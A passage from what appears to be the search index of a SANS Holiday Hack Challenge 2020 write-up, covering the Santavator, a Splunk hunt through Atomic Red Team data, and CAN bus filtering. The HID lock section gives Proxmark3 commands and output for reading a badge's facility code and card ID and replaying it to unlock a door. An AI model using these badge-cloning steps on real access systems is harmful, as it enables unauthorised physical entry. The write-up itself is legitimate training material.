the left and top of the panel.","title":"Santavator Operations"},{"location":"objectives/objective4/#solution","text":"First let's talk to Sparkle Redberry to get the key to the santavator panel Hey hey, Sparkle Redberry here! The Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here's the key! Good luck! On another note, I heard Santa say that he was thinking of canceling KringleCon this year! At first, I thought it was a joke, but he seemed serious. I\u2019m glad he changed his mind. Have you had a chance to look at the Santavator yet? With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you'll need to power the various colored receivers. ... There MAY be a way to bypass the S4 stream. We also need to collect various odd objects around the castle Broken Candycane - found at the entrance to the castle Hex Nut We can collect one hex nut near the santavator We get another hex nut when we pass through the door connecting the courtyard and the dining room. Green Bulb- found in the courtyard near the Google booth. Let's open the santavator panel. We can direct the green stream to the receiver. This will give us access to the second floor. On visiting the second floor the objective \"Operate the Santavator\" is completed. Congratulations! Let's continue and get access to all the floors by finding the red and yellow bulbs as well. We can find the red bulb on the second floor. Now let's open the santavator panel again and direct the red stream to the correct receiver.With this in place we can get access to the roof. On the roof we can find the yellow bulb. Let's direct the yellow stream also to the correct receiver in the santavator panel.","title":"Solution"},{"location":"objectives/objective4/#rejoice","text":"We fixed the santavator... and operated it! Answer This challenge doesn't require us to input an aswer. The objective is unlocked automatically when we use the santavator to access a floor.","title":"Rejoice"},{"location":"objectives/objective5/","text":"5) Open HID Lock difficulty \ud83c\udf84\ud83c\udf84 The Objective Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Chat with Bushy Evergreen After helping Bushy Evergreen with the Speaker Door Open challenge in the Speaker UNprep Terminal the following conversation ensues. That's it! What a great password... Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! The following dialogue is unlocked after we help Bushy Evergreen with the Speaker Lights On challenge in the Speaker UNprep Terminal Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! The following dialogue is unlocked after we help Bushy Evergreen with the Speaker Vending Machine challenge in the Speaker UNprep Terminal And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you! Chat with Fitzy Shortstack After helping Fitzy Shortstack with the 33.6 Kbps challenge the following conversation ensues. ahem! We did it! Thank you!! Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree... Hints Courtesy Bushy Evergreen On solving the Speaker Door Open challenge we get the following hints What's a Proxmark? The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. Reading Badges with Proxmark You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. On solving the Speaker Lights On challenge we get the following hints Impersonating Badges with Proxmark You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. lf hid sim -r 2006...... Short List of Essential Proxmark Commands There's a short list of essential Proxmark commands also available. Proxmark Talk Larry Pesce knows a thing or two about HID attacks . He's the author of a course on wireless hacking! Solution Background From all the hints we have gathered combined with Larry Pesce's amazing talk we understand that HID ProxCard is a popular system for door access control. Every HID ProxCard badge has a facility code and card ID value. These values are transmitted wirelessly first to the HID card reader and then via wire using the Weigand protocol to a controller which - based on some policies - decides whether access is to be granted. The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events and we can use it to to capture the facility code and ID value of HID ProxCard badge by running lf hid read when we are close enough to someone with a badge. We can replay the captured data to a card reader using the command lf hid sim -r <data> and we would be able to unlock the door if the badge we are impersonating has access. Finding the Proxmark Pick up the elevator 1.5 button found in the Speaker UNpreparedness room and visit floor one and a half. Pick up the proxmark which can be found in the Wrapping Room (adjacent to the workshop). Using the Proxmark for Impersonation Now we need to read the badge of an elf who has access to the HID lock in the Workshop. In our chat with Fitzy Shortstack we learned that Santa really seems to trust Shinny Upatree. To read Shinny's badge we stand close to him, open the proxmark CLI from our items and issue the lf hid read command . \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d Iceman \u2615 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d \u2744\ufe0f bleeding edge https://github.com/rfidresearchgroup/proxmark3/ [=] Session log /home/elf/.proxmark3/logs/log_20210109.txt [=] Creating initial preferences file [=] Saving preferences... [+] saved to json file /home/elf/.proxmark3/preferences.json [ Proxmark3 RFID instrument ] [ CLIENT ] client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31 compiled with GCC 7.5.0 OS:Linux ARCH:x86_64 [ PROXMARK3 ] firmware.................. PM3RDV4 external flash............ present smartcard reader.......... present FPC USART for BT add-on... absent [ ARM ] LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7 HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19 HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30 [ Hardware ] --= uC: AT91SAM7S512 Rev B --= Embedded Processor: ARM7TDMI --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 bytes (42%) --= Second Nonvolatile Program Memory Size: None --= Internal SRAM Size: 64K bytes --= Architecture Identifier: AT91SAM7Sxx Series --= Nonvolatile Program Memory Type: Embedded Flash Memory [magicdust] pm3 --> lf hid read #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 We detect that Shinny's badge has a facility code= 113, a card ID= 6025 and TAG ID=2006e22f13. Now head back over to the HID card reader in the Workshop and issue the command lf hid sim -r 2006e22f13 while standing close to the reader. Once the simulation stops after 10 seconds close the terminal. \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d Iceman \u2615 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d \u2744\ufe0f bleeding edge https://github.com/rfidresearchgroup/proxmark3/ [=] Session log /home/elf/.proxmark3/logs/log_20210109.txt [=] Creating initial preferences file [=] Saving preferences... [+] saved to json file /home/elf/.proxmark3/preferences.json [ Proxmark3 RFID instrument ] [ CLIENT ] client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31 compiled with GCC 7.5.0 OS:Linux ARCH:x86_64 [ PROXMARK3 ] firmware.................. PM3RDV4 external flash............ present smartcard reader.......... present FPC USART for BT add-on... absent [ ARM ] LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7 HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19 HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30 [ Hardware ] --= uC: AT91SAM7S512 Rev B --= Embedded Processor: ARM7TDMI --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 bytes (4 2%) --= Second Nonvolatile Program Memory Size: None --= Internal SRAM Size: 64K bytes --= Architecture Identifier: AT91SAM7Sxx Series --= Nonvolatile Program Memory Type: Embedded Flash Memory [magicdust] pm3 --> lf hid sim -r 2006e22f13 [=] Simulating HID tag using raw 2006e22f13 [=] Stopping simulation after 10 seconds. [=] Done Rejoice We successfully opened the HID lock! Answer Objective is automatically completed when we unlock the door There's more... Walk through the unlocked door. On emerging through the portrait at the other end... \ud83e\udd41\ud83e\udd41\ud83e\udd41 ... ... we have magically transformed into Santa! We also unlock 7 more objectives. TIP: We can transform back into ourselves by walking back through the portrait we emerged from","title":"5) Open HID Lock"},{"location":"objectives/objective5/#5-open-hid-lock","text":"difficulty \ud83c\udf84\ud83c\udf84","title":"5) Open HID Lock"},{"location":"objectives/objective5/#the-objective","text":"Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.","title":"The Objective"},{"location":"objectives/objective5/#chat-with-bushy-evergreen","text":"After helping Bushy Evergreen with the Speaker Door Open challenge in the Speaker UNprep Terminal the following conversation ensues. That's it! What a great password... Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! The following dialogue is unlocked after we help Bushy Evergreen with the Speaker Lights On challenge in the Speaker UNprep Terminal Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! The following dialogue is unlocked after we help Bushy Evergreen with the Speaker Vending Machine challenge in the Speaker UNprep Terminal And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you!","title":"Chat with Bushy Evergreen"},{"location":"objectives/objective5/#chat-with-fitzy-shortstack","text":"After helping Fitzy Shortstack with the 33.6 Kbps challenge the following conversation ensues. ahem! We did it! Thank you!! Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree...","title":"Chat with Fitzy Shortstack"},{"location":"objectives/objective5/#hints-courtesy-bushy-evergreen","text":"On solving the Speaker Door Open challenge we get the following hints","title":"Hints Courtesy Bushy Evergreen"},{"location":"objectives/objective5/#whats-a-proxmark","text":"The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events.","title":"What's a Proxmark?"},{"location":"objectives/objective5/#reading-badges-with-proxmark","text":"You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. On solving the Speaker Lights On challenge we get the following hints","title":"Reading Badges with Proxmark"},{"location":"objectives/objective5/#impersonating-badges-with-proxmark","text":"You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. lf hid sim -r 2006......","title":"Impersonating Badges with Proxmark"},{"location":"objectives/objective5/#short-list-of-essential-proxmark-commands","text":"There's a short list of essential Proxmark commands also available.","title":"Short List of Essential Proxmark Commands"},{"location":"objectives/objective5/#proxmark-talk","text":"Larry Pesce knows a thing or two about HID attacks . He's the author of a course on wireless hacking!","title":"Proxmark Talk"},{"location":"objectives/objective5/#solution","text":"","title":"Solution"},{"location":"objectives/objective5/#background","text":"From all the hints we have gathered combined with Larry Pesce's amazing talk we understand that HID ProxCard is a popular system for door access control. Every HID ProxCard badge has a facility code and card ID value. These values are transmitted wirelessly first to the HID card reader and then via wire using the Weigand protocol to a controller which - based on some policies - decides whether access is to be granted. The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events and we can use it to to capture the facility code and ID value of HID ProxCard badge by running lf hid read when we are close enough to someone with a badge. We can replay the captured data to a card reader using the command lf hid sim -r <data> and we would be able to unlock the door if the badge we are impersonating has access.","title":"Background"},{"location":"objectives/objective5/#finding-the-proxmark","text":"Pick up the elevator 1.5 button found in the Speaker UNpreparedness room and visit floor one and a half. Pick up the proxmark which can be found in the Wrapping Room (adjacent to the workshop).","title":"Finding the Proxmark"},{"location":"objectives/objective5/#using-the-proxmark-for-impersonation","text":"Now we need to read the badge of an elf who has access to the HID lock in the Workshop. In our chat with Fitzy Shortstack we learned that Santa really seems to trust Shinny Upatree. To read Shinny's badge we stand close to him, open the proxmark CLI from our items and issue the lf hid read command . \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d Iceman \u2615 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d \u2744\ufe0f bleeding edge https://github.com/rfidresearchgroup/proxmark3/ [=] Session log /home/elf/.proxmark3/logs/log_20210109.txt [=] Creating initial preferences file [=] Saving preferences... [+] saved to json file /home/elf/.proxmark3/preferences.json [ Proxmark3 RFID instrument ] [ CLIENT ] client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31 compiled with GCC 7.5.0 OS:Linux ARCH:x86_64 [ PROXMARK3 ] firmware.................. PM3RDV4 external flash............ present smartcard reader.......... present FPC USART for BT add-on... absent [ ARM ] LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7 HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19 HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30 [ Hardware ] --= uC: AT91SAM7S512 Rev B --= Embedded Processor: ARM7TDMI --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 bytes (42%) --= Second Nonvolatile Program Memory Size: None --= Internal SRAM Size: 64K bytes --= Architecture Identifier: AT91SAM7Sxx Series --= Nonvolatile Program Memory Type: Embedded Flash Memory [magicdust] pm3 --> lf hid read #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 We detect that Shinny's badge has a facility code= 113, a card ID= 6025 and TAG ID=2006e22f13. Now head back over to the HID card reader in the Workshop and issue the command lf hid sim -r 2006e22f13 while standing close to the reader. Once the simulation stops after 10 seconds close the terminal. \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d Iceman \u2615 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d \u2744\ufe0f bleeding edge https://github.com/rfidresearchgroup/proxmark3/ [=] Session log /home/elf/.proxmark3/logs/log_20210109.txt [=] Creating initial preferences file [=] Saving preferences... [+] saved to json file /home/elf/.proxmark3/preferences.json [ Proxmark3 RFID instrument ] [ CLIENT ] client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31 compiled with GCC 7.5.0 OS:Linux ARCH:x86_64 [ PROXMARK3 ] firmware.................. PM3RDV4 external flash............ present smartcard reader.......... present FPC USART for BT add-on... absent [ ARM ] LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7 HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19 HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30 [ Hardware ] --= uC: AT91SAM7S512 Rev B --= Embedded Processor: ARM7TDMI --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 bytes (4 2%) --= Second Nonvolatile Program Memory Size: None --= Internal SRAM Size: 64K bytes --= Architecture Identifier: AT91SAM7Sxx Series --= Nonvolatile Program Memory Type: Embedded Flash Memory [magicdust] pm3 --> lf hid sim -r 2006e22f13 [=] Simulating HID tag using raw 2006e22f13 [=] Stopping simulation after 10 seconds. [=] Done","title":"Using the Proxmark for Impersonation"},{"location":"objectives/objective5/#rejoice","text":"We successfully opened the HID lock! Answer Objective is automatically completed when we unlock the door","title":"Rejoice"},{"location":"objectives/objective5/#theres-more","text":"Walk through the unlocked door. On emerging through the portrait at the other end... \ud83e\udd41\ud83e\udd41\ud83e\udd41 ... ... we have magically transformed into Santa! We also unlock 7 more objectives. TIP: We can transform back into ourselves by walking back through the portrait we emerged from","title":"There's more..."},{"location":"objectives/objective6/","text":"6) Splunk Challenge difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Chat with Minty Candycane After helping Minty Candycane with Regex Game challenge the following conversation ensues. Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it. Hints Courtesy Minty Candycane Splunk Basics There was a great Splunk talk at KringleCon 2 that's still available! Adversary Emulation and Splunk Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk. Data Decoding and Investigation Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here! Solution In this challenge we need to find out the name of the adversary group that Santa feared would attack KringleCon. There are 7 training questions followed by a challenge question. We need to use Splunk to answer most of the questions. The final challenge question doesn't require using Splunk at all! On opening the terminal we get the following chat screen Chat with #KringleCastleSOC Let's launch the splunk search interface Training Questions Training Question 1 How many distinct MITRE ATT&CK techniques did Alice emulate? Chat with Alice Splunk Search query | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique) Search Results Answer for training question 1 13 Training Question 2 What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) Chat with Alice The definition that Alice mentions can be found here - definition of index Splunk Search query | tstats count where index=* by index | search index=T*-win OR index=T*-main | rex field=index \"(?<technique>t\\d+\\.\\d+)[\\.\\-].0*\" | search technique=\"t1059.003*\" Search Results Answer for training question 2 t1059.003-main t1059.003-win Training Question 3 One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? Hint from Alice querying MITRE and Atomic RED By querying MITRE we find that System Information Discovery corresponds to technique T1082. On querying Atomic Red Team for exploits related to this technique we find the following page This command is of particular interest and we can get the name of the register being queried. REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid Answer for training question 3 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Training Question 4 According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) Hint from Alice Splunk Search query | index=attack \"*ostap*\" Search Results We can sort the 5 attacks found by Execution Time _UTC to get the answer. Answer for training question 4 2020-11-30T17:44:15Z Training Question 5 One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? Chat With Alice Splunk Search query Searching for packages authored by frgnca on GitHub we find https://github.com/frgnca/AudioDeviceCmdlets which is made use of by atomic red team as part of T1123. index=\"T1123*\" EventCode=1 \"*WindowsAudioDevice*\" | sort _time Search Results The answer is the process ID with the lowest UTC time. Answer for training question 5 3648 Training Question 6 Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Splunk Search query index=t* file_name=\"*\\.bat*\" Search Results By seraching for each of these files in turn on atomic red team we find the right file is Discovery.bat Answer for training question 6 quser Training Question 7 According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? Hint from Alice Splunk Search query index=* sourcetype=bro:x509:json Search Results We can get the answer by expanding any of the bro:x509:json events obtained and looking at the certificate serial number. Answer for training question 7 55FCEEBB21270D9249E86F4B9DC7AA60 Challenge Question What is the name of the adversary group that Santa feared would attack KringleCon? Solution RFC 7465 is related to RC4 stream cipher. So we assume this is the encryption used for the name of the adversary. To find out the passphrase let's revisit the splunk talk. Towards the end of the video this pops up Let's go to cyberchef and first decode the base64 encoded string. Now let's use RC4 recipe with the passphrase set to \"Stay Frosty\" to unencrypt the base64 encoded string. Rejoice We found the name of the adversary group! Answer The Lollipop Guild","title":"6) Splunk Challenge"},{"location":"objectives/objective6/#6-splunk-challenge","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"6) Splunk Challenge"},{"location":"objectives/objective6/#the-objective","text":"Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?","title":"The Objective"},{"location":"objectives/objective6/#chat-with-minty-candycane","text":"After helping Minty Candycane with Regex Game challenge the following conversation ensues. Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"Chat with Minty Candycane"},{"location":"objectives/objective6/#hints-courtesy-minty-candycane","text":"","title":"Hints Courtesy Minty Candycane"},{"location":"objectives/objective6/#splunk-basics","text":"There was a great Splunk talk at KringleCon 2 that's still available!","title":"Splunk Basics"},{"location":"objectives/objective6/#adversary-emulation-and-splunk","text":"Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk.","title":"Adversary Emulation and Splunk"},{"location":"objectives/objective6/#data-decoding-and-investigation","text":"Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here!","title":"Data Decoding and Investigation"},{"location":"objectives/objective6/#solution","text":"In this challenge we need to find out the name of the adversary group that Santa feared would attack KringleCon. There are 7 training questions followed by a challenge question. We need to use Splunk to answer most of the questions. The final challenge question doesn't require using Splunk at all! On opening the terminal we get the following chat screen Chat with #KringleCastleSOC Let's launch the splunk search interface","title":"Solution"},{"location":"objectives/objective6/#training-questions","text":"","title":"Training Questions"},{"location":"objectives/objective6/#training-question-1","text":"How many distinct MITRE ATT&CK techniques did Alice emulate? Chat with Alice Splunk Search query | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique) Search Results Answer for training question 1 13","title":"Training Question 1"},{"location":"objectives/objective6/#training-question-2","text":"What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) Chat with Alice The definition that Alice mentions can be found here - definition of index Splunk Search query | tstats count where index=* by index | search index=T*-win OR index=T*-main | rex field=index \"(?<technique>t\\d+\\.\\d+)[\\.\\-].0*\" | search technique=\"t1059.003*\" Search Results Answer for training question 2 t1059.003-main t1059.003-win","title":"Training Question 2"},{"location":"objectives/objective6/#training-question-3","text":"One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? Hint from Alice querying MITRE and Atomic RED By querying MITRE we find that System Information Discovery corresponds to technique T1082. On querying Atomic Red Team for exploits related to this technique we find the following page This command is of particular interest and we can get the name of the register being queried. REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid Answer for training question 3 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","title":"Training Question 3"},{"location":"objectives/objective6/#training-question-4","text":"According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) Hint from Alice Splunk Search query | index=attack \"*ostap*\" Search Results We can sort the 5 attacks found by Execution Time _UTC to get the answer. Answer for training question 4 2020-11-30T17:44:15Z","title":"Training Question 4"},{"location":"objectives/objective6/#training-question-5","text":"One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? Chat With Alice Splunk Search query Searching for packages authored by frgnca on GitHub we find https://github.com/frgnca/AudioDeviceCmdlets which is made use of by atomic red team as part of T1123. index=\"T1123*\" EventCode=1 \"*WindowsAudioDevice*\" | sort _time Search Results The answer is the process ID with the lowest UTC time. Answer for training question 5 3648","title":"Training Question 5"},{"location":"objectives/objective6/#training-question-6","text":"Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Splunk Search query index=t* file_name=\"*\\.bat*\" Search Results By seraching for each of these files in turn on atomic red team we find the right file is Discovery.bat Answer for training question 6 quser","title":"Training Question 6"},{"location":"objectives/objective6/#training-question-7","text":"According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? Hint from Alice Splunk Search query index=* sourcetype=bro:x509:json Search Results We can get the answer by expanding any of the bro:x509:json events obtained and looking at the certificate serial number. Answer for training question 7 55FCEEBB21270D9249E86F4B9DC7AA60","title":"Training Question 7"},{"location":"objectives/objective6/#challenge-question","text":"What is the name of the adversary group that Santa feared would attack KringleCon?","title":"Challenge Question"},{"location":"objectives/objective6/#solution_1","text":"RFC 7465 is related to RC4 stream cipher. So we assume this is the encryption used for the name of the adversary. To find out the passphrase let's revisit the splunk talk. Towards the end of the video this pops up Let's go to cyberchef and first decode the base64 encoded string. Now let's use RC4 recipe with the passphrase set to \"Stay Frosty\" to unencrypt the base64 encoded string.","title":"Solution"},{"location":"objectives/objective6/#rejoice","text":"We found the name of the adversary group! Answer The Lollipop Guild","title":"Rejoice"},{"location":"objectives/objective7/","text":"7) Solve the Sleigh's CAN-D-BUS Problem difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Chat with Wunorse Openslae Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Hints Courtesy Wunorse Openslae The following hint is unlocked once we help Wunorse Openslae with the CAN bus terminal challenge. CAN ID Codes Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What's up with the brakes and doors? Solution Let us try to match each CAN-ID to a particular component.19B, 080, 018 etc are few ID's seen. We can take a screenshot to better see the ID's available. Now to create a table matching a CAN-ID to a component let us first add rules as shown below. These rules exclude all ID's so at this point no numbers should fly across our output pane. Now by selectively removing one rule at a time and trying out all the different components and noting any changes in the output pane we can find the mapping. The table below contains the mappings.188 CAN-ID doesn't seem to map to any component but this is fine. This could be an alive-check or heartbeat signal. CAN-ID component 244 Acceleration 080 Brake 019 Steering 02A start/stop 19B door(lock/unlock) 188 - The hints specifically mention brakes and door(lock/unlock) so let us focus on these components first. What's up with the door? Let's allow only only ID 19B(which corresponds to door) and block all others.We see that on pressing lock the output message is. 19B#000000000000 and on pressing unlock the output message is 19B#00000F000000. Apart from these two we see another message 19B#0000000F2057. message 19B#0000000F2057 appears spurious and we can add a rule to exclude it. What's up with the brakes? Let's allow only only ID 19B(which corresponds to door) and block all others. We see there are some spurious negative messages being sent.For example for brake value set to fifteen we see the message 080#0000000F which is expected but also see some messages of the form 0xFFFFFFF*. These are negative messages (two's complement form) but brake values range from 0-100. So let's add a rule to exclude these negative values as well. Rejoice We found both rules to exclude malicious messages and defrosted the sleigh! Answer This challenge doesn't require us to input an aswer. The objective is completed automatically when all malicious messages have been excluded.","title":"7) Solve the Sleigh's CAN-D-BUS Problem"},{"location":"objectives/objective7/#7-solve-the-sleighs-can-d-bus-problem","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"7) Solve the Sleigh's 